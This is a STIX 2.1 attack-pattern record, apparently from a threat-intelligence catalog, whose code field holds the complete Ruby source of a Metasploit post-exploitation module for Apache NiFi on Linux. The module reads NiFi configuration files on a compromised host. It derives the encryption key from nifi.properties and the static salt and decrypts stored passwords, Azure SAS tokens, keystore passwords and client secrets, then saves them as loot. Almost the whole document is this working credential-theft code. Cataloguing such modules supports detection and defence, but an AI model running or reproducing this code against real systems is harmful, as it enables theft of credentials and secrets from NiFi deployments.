{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dac4b0c2-a043-4483-b897-75e1feee2d03",
    "created": "2024-08-14T16:33:15.124295Z",
    "modified": "2024-08-14T16:33:15.124299Z",
    "name": "Apache NiFi Credentials Gather",
    "description": " This module will grab Apache NiFi credentials from various files on Linux.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/apache_nifi_credentials.rb",
            "external_id": "apache_nifi_credentials.rb"
        },
        {
            "source_name": "reference",
            "url": "https://stackoverflow.com/questions/77391210/python-vs-ruby-aes-pbkdf2"
        },
        {
            "source_name": "reference",
            "url": "https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#nifi_sensitive_props_key"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache NiFi Credentials Gather',\n        'Description' => %q{\n          This module will grab Apache NiFi credentials from various files on Linux.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # Metasploit Module\n          'Topaco', # crypto assist\n        ],\n        'Platform' => ['linux', 'unix'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'References' => [\n          ['URL', 'https://stackoverflow.com/questions/77391210/python-vs-ruby-aes-pbkdf2'],\n          ['URL', 'https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#nifi_sensitive_props_key']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('NIFI_PATH', [false, 'NiFi folder', '/opt/nifi/']),\n        OptString.new('NIFI_PROPERTIES', [false, 'NiFi Properties file', '/opt/nifi/conf/nifi.properties']),\n        OptString.new('NIFI_FLOW_JSON', [false, 'NiFi flow.json.gz file', '/opt/nifi/conf/flow.json.gz']),\n        OptString.new('NIFI_IDENTITY', [false, 'NiFi login-identity-providers.xml file', '/opt/nifi/conf/login-identity-providers.xml']),\n        OptString.new('NIFI_AUTHORIZERS', [false, 'NiFi authorizers file', '/opt/nifi/conf/authorizers.xml']),\n        OptInt.new('ITERATIONS', [true, 'Encryption iterations', 160_000])\n      ], self.class\n    )\n  end\n\n  def authorizers_file\n    return @authorizers_file if @authorizers_file\n\n    [datastore['NIFI_authorizers'], \"#{datastore['NIFI_PATH']}/conf/authorizers.xml\"].each do |f|\n      unless file_exist? f\n        vprint_bad(\"#{f} not found\")\n        next\n      end\n      vprint_status(\"Found authorizers.xml file #{f}\")\n      unless readable? f\n        vprint_bad(\"#{f} not readable\")\n        next\n      end\n      print_good(\"#{f} is readable!\")\n      @authorizers_file = f\n      break\n    end\n    @authorizers_file\n  end\n\n  def identity_file\n    return @identity_file if @identity_file\n\n    [datastore['NIFI_IDENTITY'], \"#{datastore['NIFI_PATH']}/conf/login-identity-providers.xml\"].each do |f|\n      unless file_exist? f\n        vprint_bad(\"#{f} not found\")\n        next\n      end\n      vprint_status(\"Found login-identity-providers.xml file #{f}\")\n      unless readable? f\n        vprint_bad(\"#{f} not readable\")\n        next\n      end\n      print_good(\"#{f} is readable!\")\n      @identity_file = f\n      break\n    end\n    @identity_file\n  end\n\n  def properties_file\n    return @properties_file if @properties_file\n\n    [datastore['NIFI_PROPERTIES'], \"#{datastore['NIFI_PATH']}/conf/nifi.properties\"].each do |f|\n      unless file_exist? f\n        vprint_bad(\"#{f} not found\")\n        next\n      end\n      vprint_status(\"Found nifi.properties file #{f}\")\n      unless readable? f\n        vprint_bad(\"#{f} not readable\")\n        next\n      end\n      print_good(\"#{f} is readable!\")\n      @properties_file = f\n      break\n    end\n    @properties_file\n  end\n\n  def flow_file\n    return @flow_file if @flow_file\n\n    [datastore['NIFI_FLOW_JSON'], \"#{datastore['NIFI_PATH']}/conf/flow.json.gz\"].each do |f|\n      unless file_exist? f\n        vprint_bad(\"#{f} not found\")\n        next\n      end\n      vprint_status(\"Found flow.json.gz file #{f}\")\n      unless readable? f\n        vprint_bad(\"#{f} not readable\")\n        next\n      end\n      print_good(\"#{f} is readable!\")\n      @flow_file = f\n      break\n    end\n    @flow_file\n  end\n\n  def salt\n    'NiFi Static Salt'\n  end\n\n  def process_type_azure_storage_credentials_controller_service(name, service)\n    table_entries = []\n    storage_account_name = parse_aes_256_gcm_enc_string(service['storage-account-name'])\n    return table_entries if storage_account_name.nil?\n\n    storage_account_name_decrypt = decrypt_aes_256_gcm(storage_account_name, @decrypted_key)\n\n    # this is optional\n    if service['managed-identity-client-id']\n      client_id = parse_aes_256_gcm_enc_string(service['managed-identity-client-id'])\n      return table_entries if client_id.nil?\n\n      client_id_decrypt = decrypt_aes_256_gcm(client_id, @decrypted_key)\n    else\n      client_id_decrypt = ''\n    end\n\n    sas_token = parse_aes_256_gcm_enc_string(service['storage-sas-token'])\n    return table_entries if sas_token.nil?\n\n    sas_token_decrypt = decrypt_aes_256_gcm(sas_token, @decrypted_key)\n\n    information = \"storage-account-name: #{storage_account_name_decrypt}\"\n    information << \", storage-endpoint-suffix: #{service['storage-endpoint-suffix']}\" if service['storage-endpoint-suffix']\n    table_username = client_id_decrypt.empty? ? '' : \"managed-identity-client-id: #{client_id_decrypt}\"\n\n    @flow_json_string = @flow_json_string.gsub(service['storage-sas-token'], sas_token_decrypt)\n    @flow_json_string = @flow_json_string.gsub(service['storage-account-name'], storage_account_name_decrypt)\n    @flow_json_string = @flow_json_string.gsub(service['managed-identity-client-id'], client_id_decrypt) unless client_id_decrypt.empty?\n    table_entries << [name, table_username, sas_token_decrypt, information]\n    table_entries\n  end\n\n  # This function is built to attempt to decrypt a processor/service that we dont have a specific decryptor for.\n  # we may miss grouping some fields together, but its better to print them out than do nothing with them.\n  def process_type_generic(name, processor)\n    table_entries = []\n    processor.each do |property|\n      property_name = property[0]\n      property_value = property[1]\n      next unless property_value.is_a? String\n      next unless property_value.starts_with? 'enc{'\n\n      password = parse_aes_256_gcm_enc_string(property_value)\n      next if password.nil?\n\n      password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)\n      table_entries << [name, '', password_decrypt, \"Property name: #{property_name}\"]\n      @flow_json_string = @flow_json_string.gsub(property_value, password_decrypt)\n    end\n    table_entries\n  end\n\n  def process_type_org_apache_nifi_processors_standard_gethttp(name, processor)\n    table_entries = []\n    return table_entries unless processor['Password']\n\n    username = processor['Username']\n    url = processor['URL']\n    password = parse_aes_256_gcm_enc_string(processor['Password'])\n    return table_entries if password.nil?\n\n    password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)\n    table_entries << [name, username, password_decrypt, \"URL: #{url}\"]\n    @flow_json_string = @flow_json_string.gsub(processor['Password'], password_decrypt)\n    table_entries\n  end\n\n  def process_type_standard_restricted_ssl_context_service(controller_properties)\n    table_entries = []\n    if controller_properties['Keystore Filename'] && controller_properties['Keystore Password']\n      name = 'Keystore'\n      username = controller_properties['Keystore Filename']\n      password = parse_aes_256_gcm_enc_string(controller_properties['Keystore Password'])\n      unless password.nil?\n        password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)\n        table_entries << [name, username, password_decrypt, '']\n        @flow_json_string = @flow_json_string.gsub(controller_properties['Keystore Password'], password_decrypt)\n      end\n    end\n\n    if controller_properties['Truststore Filename'] && controller_properties['Truststore Password']\n      name = 'Truststore'\n      username = controller_properties['Truststore Filename']\n      password = parse_aes_256_gcm_enc_string(controller_properties['Truststore Password'])\n      unless password.nil?\n        password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)\n        table_entries << [name, username, password_decrypt, \"Truststore Type #{controller_properties['Truststore Type']}\"]\n        @flow_json_string = @flow_json_string.gsub(controller_properties['Truststore Password'], password_decrypt)\n      end\n    end\n\n    return table_entries unless controller_properties['Truststore Filename'] && controller_properties['key-password']\n\n    name = 'Key Password'\n    username = controller_properties['Truststore Filename']\n    password = parse_aes_256_gcm_enc_string(controller_properties['key-password'])\n    return table_entries if password.nil?\n\n    password_decrypt = decrypt_aes_256_gcm(password, @decrypted_key)\n    table_entries << [name, username, password_decrypt, \"Truststore Type #{controller_properties['Truststore Type']}\"]\n    @flow_json_string = @flow_json_string.gsub(controller_properties['key-password'], password_decrypt)\n\n    table_entries\n  end\n\n  def decrypt_aes_256_gcm(enc_fields, key)\n    vprint_status('    Decryption initiated for AES-256-GCM')\n    vprint_status(\"      Nonce: #{enc_fields[:nonce]}, Auth Tag: #{enc_fields[:auth_tag]}, Ciphertext: #{enc_fields[:ciphertext]}\")\n    cipher = OpenSSL::Cipher.new('AES-256-GCM')\n    cipher.decrypt\n    cipher.key = key\n    cipher.iv_len = 16\n    cipher.iv = [enc_fields[:nonce]].pack('H*')\n    cipher.auth_tag = [enc_fields[:auth_tag]].pack('H*')\n\n    decrypted_text = cipher.update([enc_fields[:ciphertext]].pack('H*'))\n    decrypted_text << cipher.final\n    decrypted_text\n  end\n\n  def parse_aes_256_gcm_enc_string(password)\n    password = password[4, password.length - 5] # remove enc{ at the beginning and } at the end\n    password.match(/(?<nonce>\\w{32})(?<ciphertext>\\w+)(?<auth_tag>\\w{32})/) # parse out the fields\n  end\n\n  def run\n    unless ((flow_file && properties_file) || identity_file)\n      fail_with(Failure::NotFound, 'Unable to find login-identity-providers.xml, nifi.properties and/or flow.json.gz files')\n    end\n\n    properties = read_file(properties_file)\n    path = store_loot('nifi.properties', 'text/plain', session, properties, 'nifi.properties', 'nifi properties file')\n    print_good(\"properties data saved in: #{path}\")\n    key = properties.scan(/^nifi.sensitive.props.key=(.+)$/).flatten.first.strip\n    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if key.nil?\n    print_good(\"Key: #{key}\")\n    algorithm = properties.scan(/^nifi.sensitive.props.algorithm=(\\w+)$/).flatten.first.strip\n    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if algorithm.nil?\n\n    columns = ['Name', 'Username', 'Password', 'Other Information']\n    table = Rex::Text::Table.new('Header' => 'NiFi Flow Data', 'Indent' => 1, 'Columns' => columns)\n\n    if flow_file\n      flow_json = Zlib.gunzip(read_file(flow_file))\n\n      path = store_loot('nifi.flow.json', 'application/json', session, flow_json, 'flow.json', 'nifi flow data')\n      print_good(\"Original data containing encrypted fields saved in: #{path}\")\n\n      flow_json = JSON.parse(flow_json)\n      @flow_json_string = JSON.pretty_generate(flow_json) # so we can save an unencrypted version as well\n\n      # NIFI_PBKDF2_AES_GCM_256 is the default as of 1.14.0\n      # leave this as an if statement so it can be expanded to include more algorithms in the future\n      if algorithm == 'NIFI_PBKDF2_AES_GCM_256'\n        # https://gist.github.com/tylerpace/8f64b7e00ffd9fb1ef5ea70df0f9442f\n        @decrypted_key = OpenSSL::PKCS5.pbkdf2_hmac(key, salt, datastore['ITERATIONS'], 32, OpenSSL::Digest.new('SHA512'))\n\n        vprint_status('Checking root group processors')\n        flow_json.dig('rootGroup', 'processors').each do |processor|\n          vprint_status(\"  Analyzing #{processor['processor']} of type #{processor['type']}\")\n          case processor['type']\n          when 'org.apache.nifi.processors.standard.GetHTTP'\n            table_entries = process_type_org_apache_nifi_processors_standard_gethttp(processor['name'], processor['properties'])\n          else\n            table_entries = process_type_generic(processor['name'], processor['properties'])\n          end\n          table.rows.concat table_entries\n        end\n\n        vprint_status('Checking root group controller services')\n        flow_json.dig('rootGroup', 'controllerServices').each do |service|\n          vprint_status(\"  Analyzing #{service['name']} of type #{service['type']}\")\n          case service['type']\n          when 'org.apache.nifi.services.azure.storage.AzureStorageCredentialsControllerService_v12',\n            'org.apache.nifi.services.azure.storage.AzureStorageCredentialsControllerService'\n            table_entries = process_type_azure_storage_credentials_controller_service(service['name'], service['properties'])\n          when 'org.apache.nifi.ssl.StandardRestrictedSSLContextService'\n            table_entries = process_type_standard_restricted_ssl_context_service(service['properties'])\n          else\n            table_entries = process_type_generic(service['name'], service['properties'])\n          end\n          table.rows.concat table_entries\n        end\n\n      else\n        print_bad(\"Processor for #{algorithm} not implemented in module. Use nifi-toolkit to potentially change algorithm.\")\n      end\n\n      unless @flow_json_string == JSON.pretty_generate(flow_json) # dont write if we didn't change anything\n        path = store_loot('nifi.flow.decrypted.json', 'application/json', session, @flow_json_string, 'flow.decrypted.json', 'nifi flow data decrypted')\n        print_good(\"Decrypted data saved in: #{path}\")\n      end\n    end\n\n    vprint_status('Checking identity file')\n    if identity_file\n      identity_content = read_file(identity_file)\n      xml = Nokogiri::XML.parse(identity_content)\n\n      xml.xpath('//loginIdentityProviders//provider').each do |c|\n        name = c.xpath('identifier').text\n        username = c.xpath('property[@name=\"Username\"]').text\n        hash = c.xpath('property[@name=\"Password\"]').text\n        next if (username.blank? || hash.blank?)\n\n        table << [name, username, hash, 'From login-identity-providers.xml']\n\n        credential_data = {\n          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n          origin_type: :session,\n          post_reference_name: refname,\n          private_type: :nonreplayable_hash,\n          private_data: hash,\n          session_id: session_db_id,\n          username: username,\n          workspace_id: myworkspace_id\n        }\n        create_credential(credential_data)\n      end\n    end\n\n    vprint_status('Checking authorizers file')\n    if authorizers_file\n      authorizers_content = read_file(authorizers_file)\n      xml = Nokogiri::XML.parse(authorizers_content)\n\n      xml.xpath('//authorizers//userGroupProvider').each do |c|\n        next if c.xpath('property[@name=\"Client Secret\"]').text.blank?\n\n        name = c.xpath('identifier').text\n        username = \"Directory/Tenant ID: #{c.xpath('property[@name=\"Directory ID\"]').text}\" \\\n                   \", Application ID: #{c.xpath('property[@name=\"Application ID\"]').text}\"\n        password = c.xpath('property[@name=\"Client Secret\"]').text\n        next if (username.blank? || hash.blank?)\n\n        table << [name, username, password, 'From authorizers.xml']\n      end\n    end\n\n    if !table.rows.empty?\n      print_good('NiFi Flow Values')\n      print_line(table.to_s)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}